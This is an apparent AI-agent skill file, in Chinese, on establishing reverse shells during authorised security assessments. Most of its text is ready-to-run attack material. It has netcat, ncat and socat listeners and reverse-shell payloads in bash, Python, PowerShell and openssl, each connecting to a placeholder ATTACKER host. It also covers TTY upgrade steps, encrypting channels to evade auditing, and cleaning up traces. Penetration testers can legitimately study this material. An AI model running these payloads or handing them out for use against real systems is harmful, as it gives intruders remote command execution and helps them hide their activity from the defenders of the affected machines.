---
name: as-reverse-shell
description: 建立与处置反弹 shell：VPS 监听器选型、各语言载荷生成、交互式 TTY 升级、加密通道与痕迹管理。当在授权评估中获得代码执行点、需要获取交互式命令行时使用。
---

# 反弹 shell 建立与处置

反弹 shell 是获得初始执行点之后的交互化步骤。全程只在授权范围内操作；每个载荷与监听器都要登记到台账（campaign_upsert 记录步骤）。

## 监听器选型

| 工具 | 适用 |
|------|------|
| `nc -lvnp PORT` | 快速一次性验证 |
| `ncat -lvnp PORT --ssl` | 需要加密通道时 |
| `socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:...` | 需要高级管道 |
| `pwncat-cs` / `sliver` handler | 长会话、文件传输、自动加固 |

```bash
# VPS 侧基础监听
nc -lvnp 4444
# 加密
ncat -lvnp 4444 --ssl
```

## 载荷生成（按目标语言/环境选）

```bash
# bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# powershell（Windows）
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write([byte[]][Text.Encoding]::ASCII.GetBytes($o),0,$o.Length)}"

# 加密（openssl 双向）
# 攻击机
ncat -lvnp 4444 --ssl
# 目标
mkfifo /tmp/f;cat /tmp/f|openssl s_client -connect ATTACKER:4444 -quiet 2>/dev/null|/bin/sh -i 2>&1|tee /tmp/f
```

## 升级为交互式 TTY

```bash
# 目标侧（Linux）
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 按 Ctrl-Z 暂停，攻击机侧
stty raw -echo; fg
# 目标侧
export TERM=xterm; stty rows 40 cols 120
```

## 处置要点

- 稳定性：一次性验证用 nc，长会话换 pwncat/sliver 等带重连的 handler
- 加密：链路可能被审计时一律 `--ssl`/openssl
- Windows 目标优先考虑 WinRM/RDP 等原生物（配合授权），不强行降级到 raw shell
- 痕迹：结束即 `exit` 干净退出，删除落地的脚本文件（如 agent），监听器下线
- 台账：`campaign_upsert` 记录监听端口、目标、时间窗口与退出状态；端口用完即关
